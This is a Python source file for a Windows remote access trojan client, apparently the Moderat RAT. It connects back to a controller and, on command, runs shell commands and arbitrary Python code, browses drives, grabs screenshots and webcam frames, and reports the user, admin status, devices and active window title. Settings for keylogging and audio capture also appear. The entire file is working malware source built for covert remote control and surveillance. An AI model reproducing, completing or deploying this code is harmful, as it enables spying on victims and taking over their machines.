import asyncore
import socket
import time
import ast
import os
import sys
import threading
import ctypes
import platform
import zlib
import vidcap
import subprocess


MODERATOR = 'core'

Kernel32 = ctypes.windll.kernel32
User32 = ctypes.windll.user32
Shell32 = ctypes.windll.shell32
Gdi32 = ctypes.windll.gdi32
Psapi = ctypes.windll.psapi


def get_username():
    advapi32 = ctypes.windll.advapi32
    GetUserNameW = advapi32.GetUserNameW
    GetUserNameW.argtypes = [ctypes.c_wchar_p, ctypes.POINTER(ctypes.c_uint)]
    GetUserNameW.restype = ctypes.c_uint

    def GetUserName():
        buffer = ctypes.create_unicode_buffer(2)
        size = ctypes.c_uint(len(buffer))
        while not GetUserNameW(buffer, ctypes.byref(size)):
            buffer = ctypes.create_unicode_buffer(len(buffer) * 2)
            size.value = len(buffer)
        return buffer.value

    return GetUserName()


def get_window_title():
    get_foreground_window = User32.GetForegroundWindow
    get_window_text_length = User32.GetWindowTextLengthW
    get_window_text = User32.GetWindowTextW
    hwnd = get_foreground_window()
    length = get_window_text_length(hwnd)
    buff = ctypes.create_unicode_buffer(length + 1)
    get_window_text(hwnd, buff, length + 1)
    return buff.value


def check_microphone():
    try:
        import pyaudio
        p = pyaudio.PyAudio()
        device_name = p.get_default_input_device_info()
        del p
        return True
    except:
        return False


def check_webcam():
    try:
        import vidcap
        cam = vidcap.new_Dev(0, 0)
        cam.getdisplayname()
        del cam
        return True
    except:
        return False

os_type = str(sys.platform)
os_name = str(platform.platform())
os_user = get_username()
is_user_admin = str(Shell32.IsUserAnAdmin())
has_webcam = check_webcam()


class Explorer:

    def __init__(self):
        self.startupinfo = subprocess.STARTUPINFO()
        self.startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW

        self.info = {
            'path': os.getcwdu(),
            'logicalDrives': {},
            'content': {},
        }

        self.get_drives()

    @staticmethod
    def has_hidden_attribute(filepath):
        try:
            attrs = Kernel32.GetFileAttributesW(unicode(filepath))
            assert attrs != -1
            result = bool(attrs & 2)
        except (AttributeError, AssertionError):
            result = False
        return result

    def get_drives(self):
        print 'get_drives'
        uppercase = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
        bitmask = Kernel32.GetLogicalDrives()
        for letter in uppercase:
            drive = u'{}:\\'.format(letter)
            if bitmask & 1:
                mounted_letters = subprocess.Popen('wmic logicaldisk where deviceid="%s:" get Size' % letter,
                                                   startupinfo=self.startupinfo, stdout=subprocess.PIPE,
                                                   stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
                length = mounted_letters.stdout.readlines()[1].strip()
                if length.isdigit():
                    os.chdir(drive)
                else:
                    continue
                volume_name_buffer = ctypes.create_unicode_buffer(1024)
                Kernel32.GetVolumeInformationW(drive, volume_name_buffer,
                                               ctypes.sizeof(volume_name_buffer), None, None, None, None,
                                               None)
                self.info['logicalDrives'][drive] = {
                    'name': volume_name_buffer.value,
                    'type': Kernel32.GetDriveTypeW(drive),
                }
            bitmask >>= 1

    def get_content(self):
        try:
            self.info['path'] = os.getcwdu()
            self.info['content'] = {}
            for n, i in enumerate(os.listdir(u'.')):
                self.info['content'][n] = {
                    'name': i,
                    'type': os.path.isfile(i),
                    'size': os.path.getsize(i),
                    'modified': time.ctime(os.path.getmtime(i)),
                    'hidden': self.has_hidden_attribute(i)
                }
            return str(self.info)
        except WindowsError:
            return 'windowsError'


class Webcam:

    def __init__(self):
        try:
            self.cam = vidcap.new_Dev(0, 0)
        except:
            pass

    def get(self):
        buff, width, height = self.cam.getbuffer()
        return str({
            'webcambits': zlib.compress(buff),
            'width': width,
            'height': height,
        })


class Screenshot:

    def __init__(self):
        # Init Screen Variables
        self.hDesktopWnd = User32.GetDesktopWindow()
        self.left = User32.GetSystemMetrics(76)
        self.top = User32.GetSystemMetrics(77)
        self.right = User32.GetSystemMetrics(78)
        self.bottom = User32.GetSystemMetrics(79)
        self.width = self.right - self.left
        self.height = self.bottom - self.top

        self.bmp_info = BITMAPINFO()

    def get(self):
        return str({
            'width': self.width,
            'height': self.height,
            'screenshotbits': self.screen_bits()
        })

    def screen_bits(self):
        h_desktop_dc = User32.GetWindowDC(self.hDesktopWnd)
        h_capture_dc = Gdi32.CreateCompatibleDC(h_desktop_dc)
        h_capture_bitmap = Gdi32.CreateCompatibleBitmap(h_desktop_dc, self.width, self.height)
        Gdi32.SelectObject(h_capture_dc, h_capture_bitmap)
        Gdi32.BitBlt(h_capture_dc, 0, 0, self.width, self.height, h_desktop_dc, self.left, self.top, 0x00CC0020)
        hdc = User32.GetDC(None)
        self.bmp_info.bmiHeader.biSize = ctypes.sizeof(BITMAPINFOHEADER)
        dib_rgb_colors = 0
        Gdi32.GetDIBits(hdc, h_capture_bitmap, 0, 0, None, ctypes.byref(self.bmp_info), dib_rgb_colors)
        self.bmp_info.bmiHeader.biSizeimage = int(
            self.bmp_info.bmiHeader.biWidth * abs(self.bmp_info.bmiHeader.biHeight) * (self.bmp_info.bmiHeader.biBitCount + 7) / 8)
        p_buf = ctypes.create_unicode_buffer(self.bmp_info.bmiHeader.biSizeimage)
        Gdi32.GetBitmapBits(h_capture_bitmap, self.bmp_info.bmiHeader.biSizeimage, p_buf)
        return zlib.compress(p_buf)


class InfoNfo:

    def __init__(self):
        self.info_path = os.path.join(os.path.dirname(sys.argv[0]), 'info.nfo')
        if not os.path.exists(self.info_path):
            self.set_default_values()
        self.values = self.get_values()

    def get_values(self):
        with open(self.info_path, 'r') as _file:
            return ast.literal_eval(_file.read())

    def set_values(self, values):
        new_values = self.get_values()
        for key in values.keys():
            new_values[key] = values[key]
        with open(self.info_path, 'w') as _file:
            _file.write(str(new_values))
            return new_values

    def set_default_values(self):
        with open(self.info_path, 'w') as _file:
            _file.write(
                str({
                    'i':    'noKey',
                    'kts':  False,
                    'kt':   30,
                    'ats':  False,
                    'at':   30,
                    'sts':  False,
                    'std':  20,
                    'st':   30,
                    'usp':  True,
                })
            )


class Modes(threading.Thread):
    def __init__(self, send, send_data, msg, key):
        super(Modes, self).__init__()
        self.payload = msg['payload']
        self.mode = msg['mode']
        self.session_id = msg['session_id']
        self.module_id = msg['module_id']
        self.mode = msg['mode']
        self.send = send
        self.send_data = send_data
        self.key = key
        self.active_thread = True

    def stop(self):
        self.active_thread = False

    def run(self):
        if self.mode == 'p2pMode':
            if self.payload.startswith('startP2p'):
                if len(self.payload.split('%SPLITTER%')) == 4:
                    comm, ip_address, port, mark = self.payload.split('%SPLITTER%')
                    if port.isdigit():
                        p2p_client = ModeratClient(ip_address, int(port), P2P=mark)
                        self.send_data('p2pStarted', self.mode, self.session_id, self.module_id)
                        return
                else:
                    self.send_data('p2pNotStarted', self.mode, self.session_id, self.module_id)
                return
            elif self.payload == 'stopP2p':
                print 'P2pSTOP'

        elif self.mode == 'getScreen':
            self.send_data(screenshot.get(), self.mode, self.session_id, self.module_id)
            return

        elif self.mode == 'getWebcam':
            if has_webcam:
                self.send_data(webcamera.get(), self.mode, self.session_id, self.module_id)
                return
            else:
                self.send_data('noWebcamError', self.mode, self.session_id, self.module_id)

        elif self.mode == 'scriptingMode':
            mprint = ''
            try:
                exec self.payload
                if mprint == '':
                    return '<font color="#e74c3c">No output</font><br>example: mprint = "STRING type"'
                self.send_data(str(mprint), self.mode, self.session_id, self.module_id)
                return
            except Exception as error:
                self.send_data(str(error), self.mode, self.session_id, self.module_id)
                return

        elif self.mode == 'explorerMode' and self.payload.startswith('cd '):
            try:
                os.chdir(self.payload[3:])
            except:
                pass
            self.send_data(explorer.get_content(), self.mode, self.session_id, self.module_id)
            return

        # List Directory
        elif self.mode == 'explorerMode':
            execproc = subprocess.Popen(self.payload, shell=True, stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            execproc.communicate()
            self.send_data(explorer.get_content(), self.mode, self.session_id, self.module_id)
            return

        elif self.mode == 'shellMode' and self.payload.startswith('cd '):
            try:
                os.chdir(self.payload[3:])
                self.send_data('', self.mode, self.session_id, self.module_id)
            except:
                self.send_data('dirOpenError', self.mode, self.session_id, self.module_id)

        elif self.mode == 'shellMode':
            execproc = subprocess.Popen(self.payload, shell=True,
                                        stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            while self.active_thread:
                time.sleep(0.1)
                line = execproc.stdout.readline()
                line = line if len(line) > 0 else execproc.stderr.readline()
                if line == '' and execproc.poll() is not None:
                    break
                message = {
                    'payload': line,
                    'mode': self.mode,
                    'from': 'client',
                    'session_id': self.session_id,
                    'module_id': self.module_id,
                    'key': self.key,
                }
                self.send(str(message) + '[ENDOFMESSAGE]')
            self.send_data('endCommandExecute', self.mode, self.session_id, self.module_id)


class ModeratClient(asyncore.dispatcher):
    def __init__(self, IP_ADDRESS, PORT, P2P=False):
        asyncore.dispatcher.__init__(self)
        self.P2P = P2P
        self.IP_ADDRESS = IP_ADDRESS
        self.PORT = PORT
        self.read_buffer = ''
        self.out_buffer = ''
        self.commands = []
        self.modes = {}
        self.info = InfoNfo()
        print self.IP_ADDRESS, ' ', self.PORT
        self.create_socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connect((self.IP_ADDRESS, self.PORT))

    def handle_connect(self):
        self.connected = True
        print 'connected'

    def initiate_connection_with_server(self):
        self.close()
        if not self.P2P:
            asyncore.dispatcher.__init__(self)
            self.create_socket(socket.AF_INET, socket.SOCK_STREAM)
            print self.IP_ADDRESS, ' ', self.PORT
            self.connect((self.IP_ADDRESS, self.PORT))
            print 'reconnected'

    def handle_close(self):
        print("problem reaching server.")
        if self.P2P:
            self.close()
        else:
            self.connected = False
            time.sleep(5)
            self.initiate_connection_with_server()

    def handle_error(self):
        pass

    def writable(self):
        return len(self.out_buffer) > 0

    def readable(self):
        return True

    def handle_write(self, end='[ENDOFMESSAGE]'):
        nbytes = self.send(self.out_buffer.split(end)[0]+end)
        self.out_buffer = self.out_buffer[nbytes:]

    def handle_read(self, end='[ENDOFMESSAGE]'):
        data = self.recv(8192)
        if data:
            self.read_buffer += data
            if self.read_buffer.endswith(end):
                if end in self.read_buffer[:-len(end)]:
                    for i in range(self.read_buffer.count(end)):
                        self.commands.append(self.read_buffer.split(end)[i])
                else:
                    self.commands.append(self.read_buffer[:-len(end)])
            print 'received'
            self.reactor()
            self.read_buffer = ''

    def send_data(self, msg, mode, session_id='', module_id=''):
        message = {
            'payload': msg,
            'mode': mode,
            'from': 'client',
            'session_id': session_id,
            'module_id': module_id,
            'key': self.info.values['i'],
        }
        self.out_buffer = str(message) + '[ENDOFMESSAGE]'
        if mode != 'infoChecker':
            print 'sent {}'.format(mode)

    def reactor(self):
        for command in self.commands:
            msg = ast.literal_eval(command)
            if msg['mode'] == 'connectSuccess':
                if self.P2P:
                    payload = {
                        'os_type': str(sys.platform),
                        'os': str(platform.platform()),
                        'i': self.info.values['i'],
                        'mark': self.P2P
                    }
                    self.send_data(str(payload), 'clientInitializing', MODERATOR)
                else:
                    self.send_data(self.info.values['i'], 'clientInitializing', MODERATOR)
            elif msg['mode'] == 'clientInitializing':
                if len(msg['payload']) == 12:
                    self.info.set_values({'i': msg['payload']})
                    self.info.values['i'] = msg['payload']
            elif msg['mode'] == 'setLogSettings':
                self.info.values = self.info.set_values(msg['payload'])
            elif msg['mode'] == 'terminateProcess':
                if self.modes.has_key(msg['payload']):
                    self.modes[msg['payload']].stop()
                    del self.modes[msg['payload']]
            elif msg['mode'] == 'infoChecker':
                payload = {
                    'os_type': os_type,
                    'os': os_name,
                    'user': os_user,
                    'privileges': is_user_admin,
                    'audio_device': check_microphone(),
                    'webcamera_device': has_webcam,
                    'window_title': get_window_title(),
                    'key': self.info.values['i'],
                    'kts': self.info.values['kts'],
                    'kt': self.info.values['kt'],
                    'ats': self.info.values['ats'],
                    'at': self.info.values['at'],
                    'sts': self.info.values['sts'],
                    'std': self.info.values['std'],
                    'st': self.info.values['st'],
                    'usp': self.info.values['usp'],
                }
                self.send_data(payload, 'infoChecker')
            else:
                self.modes[msg['module_id']] = Modes(self.send,
                                                     self.send_data,
                                                     msg,
                                                     self.info.values['i'])
                self.modes[msg['module_id']].start()
        self.commands = []


# HELPERS
class BITMAPINFOHEADER(ctypes.Structure):
    _fields_ = [
        ('biSize', ctypes.c_uint32),
        ('biWidth', ctypes.c_int),
        ('biHeight', ctypes.c_int),
        ('biPlanes', ctypes.c_short),
        ('biBitCount', ctypes.c_short),
        ('biCompression', ctypes.c_uint32),
        ('biSizeimage', ctypes.c_uint32),
        ('biXPelsPerMeter', ctypes.c_long),
        ('biYPelsPerMeter', ctypes.c_long),
        ('biClrUsed', ctypes.c_uint32),
        ('biClrImportant', ctypes.c_uint32)]


class BITMAPINFO(ctypes.Structure):
    _fields_ = [
        ('bmiHeader', BITMAPINFOHEADER),
        ('bmiColors', ctypes.c_ulong * 3)]


# Objects
screenshot = Screenshot()
webcamera = Webcam()
explorer = Explorer()


client = ModeratClient('127.0.0.1', 5545, P2P=False)
asyncore.loop(0.1)